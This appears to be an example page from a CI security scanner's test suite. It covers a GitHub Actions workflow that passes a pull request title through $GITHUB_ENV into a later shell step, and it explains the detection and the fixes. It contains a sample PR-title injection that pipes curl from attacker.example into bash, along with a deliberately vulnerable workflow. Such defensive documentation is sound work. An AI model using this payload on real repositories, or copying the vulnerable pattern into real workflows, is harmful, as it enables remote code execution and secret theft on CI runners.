# 02 — `$GITHUB_ENV` cross-step bridge (TAINT-GH-003)

The maintainer routes the PR title through `$GITHUB_ENV` so a later step can read it as a regular shell variable. The runner materialises the file as real environment variables **between steps**, so the second step starts with the attacker's bytes already in `$TITLE`.

## The workflow

```yaml
on:
  pull_request_target:
    types: [opened, edited, synchronize]

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - env:
          RAW_TITLE: ${{ github.event.pull_request.title }}
        run: echo "TITLE=$RAW_TITLE" >> $GITHUB_ENV

      - run: |
          echo "Inspecting title: $TITLE"
          if [[ "$TITLE" == *"[urgent]"* ]]; then
            echo "Apply: priority/urgent"
          fi
```

See [`.github/workflows/vulnerable.yml`](.github/workflows/vulnerable.yml).

## Why it's wrong

Writing `TITLE=$RAW_TITLE` to `$GITHUB_ENV` is **not** sanitisation — the runner promotes the raw string to a real env var. When the next step's bash expands `$TITLE`, it sees the attacker's bytes verbatim. A PR title of `widget" || curl http://attacker.example/x | bash; #` produces a step that runs the injected command.

The shallow form (`${{ github.event.X }} >> $GITHUB_ENV` on one line) is caught by SEC4-GH-006. TAINT-GH-003 catches the indirected form where the attacker bytes pass through an env var first.

## Run it

```
taintly examples/02-github-env-bridge
```

Expected headline finding:

```
[CRITICAL] TAINT-GH-003: Attacker-controlled context persisted into $GITHUB_ENV reaches run: in a later step (deep taint)
```

## How to fix

1. **Don't bridge attacker-controlled values through `$GITHUB_ENV` at all.** If the second step needs the title, pass it as a quoted env var on that step alone:

   ```yaml
   - env:
       RAW_TITLE: ${{ github.event.pull_request.title }}
     run: |
       if [[ "$RAW_TITLE" == *"[urgent]"* ]]; then ...; fi
   ```

2. **If the value MUST cross steps, validate at the boundary.** Strip to `[A-Za-z0-9 _-]` before writing — the safe shape leaves the writer step, never the raw bytes.
